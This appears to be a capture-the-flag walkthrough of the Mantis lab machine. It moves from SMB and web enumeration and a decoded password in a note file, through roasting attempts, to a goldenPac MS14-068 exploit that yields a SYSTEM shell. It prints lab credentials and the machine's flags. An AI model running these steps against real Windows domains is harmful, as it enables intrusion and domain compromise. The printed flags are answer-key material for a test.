port 88 (jkerberos)
port 445 (smb)
port 135 (ldap)

Utilizing port 445(smb), I utilize crackmapexec to collect additional information about the victim's machines.
``` 
❯ crackmapexec smb 10.10.10.52

SMB         10.10.10.52     445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)
```

Crackmapexec provided me some information , such as the domain name, which I then saved in my hosts file.

Next I attempted to use smbmap to list the shared drivers. However, I encountered an  "Authentication error ". This indicates that I need credentials to access the shared drivers.

I began by enumerating the http ports on the website
``` bash
10.10.10.52:1337 # The typical IIS7 image
# enumerate with wfuzz or gobuster
gobuster dir -u http://10.10.10.52:1337/ -w /usr/share/seclist.... --add-slash -x php,html,txt

# Waiting for the gobuster scan I enumerate another port
10.10.10.52:8080 # Some blog and panel login -> Nothing interesant

```

After gobuster finished the scan, the tool discovered two directories: "orchard" and "secure_notes"
When I checked the  "secure_notes" directory, I found a .txt file containing some instructions. The file's name appeared to be a string encoded in base64.
``` bash
dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt
1. Download OrchardCMS
2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
3. Launch IIS and add new website and point to Orchard CMS folder location.
4. Launch browser and navigate to http://localhost:8080
5. Set admin password and configure sQL server connection string.
6. Add blog pages with admin user.
```

After decoding the string, I obtained a hexadecimal string. To reverse it, I used the "xxd" tool

``` bash
❯ echo "NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx" | base64 -d | xxd -ps -r; echo
m$$ql_S@_P@ssW0rd!
```

I obtained credential and information from the note, Port 1433 is associated with the Microsoft SQL Server service , and I can attempt to connect to it using these credentials.

```
blog_Orchard_Users_UserPartRecord
2	admin		admin	AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==	Hashed
15	James	james@htb.local	james	J@m3s_P@ssW0rd!	Plaintext

	james J@m3s_P@ssW0rd!
```

I obtain credentials and then verify them using crackmapexec
``` 
❯ crackmapexec smb 10.10.10.52 -u 'james' -p 'J@m3s_P@ssW0rd!'
SMB         10.10.10.52     445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.52     445    MANTIS           [+] htb.local\james:J@m3s_P@ssW0rd! 
```

These credentials are valid, I am using them to enumerate domain users with rpcclient
``` 
rpcclient -U 'james%J@m3s' 10.10.100.52 -c "enumdomgroups"
rpcclient -U 'james%J@m3s' 10.10.100.52 -c "querygroupmem 0x200"
rpcclient -U 'james%J@m3s' 10.10.100.52 -c "queryuser 0x1f4"
```

When I receive a username, I always check for "ASREProast Attack" and "kerberoasting attack"
``` bash
GetNPUsers htb.local/ -no-pass -usersfile users -> ASREProast attacl
GetUserSPNs htb.local/james@10.10.10.52 -> kerberoasting attack
```

As the user james I can't do anything for the moment

I'm going to gather information and potential attack vectors with bloodhound
``` bash
bloodhound-python -c ALL -ns 10.10.10.52 -d htb.local -u 'james' -p 'J@m3s----'
neo4j console
bloodhound
```

The Bloodhound tool didn't provide me with any interesting results.
I need search for more information. I'm using the repository "PayloadsAllTheThings/Methodology and Resources/Active Directory Attack.md(ms14-068)" https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#from-cve-to-system-shell-on-dc
``` bash
goldenPac.py htb.local/james@10.10.10.52 #this give me another domian, I save it in my hosts file (mantis and mantis.htb.local)

❯ goldenPac.py htb.local/james@mantis
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller mantis.htb.local
[*] mantis.htb.local found vulnerable!
[*] Requesting shares on mantis.....
[*] Found writable share ADMIN$
[*] Uploading file HrJEEonA.exe
[*] Opening SVCManager on mantis.....
[*] Creating service oCvV on mantis.....
[*] Starting service oCvV.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

I gained acces as "nt authority\system" simpy by exploiting the MS14-068 vulnerability with goldenPac tool
	User flag 5abd3b98a6326562c93825ac30d63da1
root flag cdc2ac1467172cda8f8b6fbdf008300c




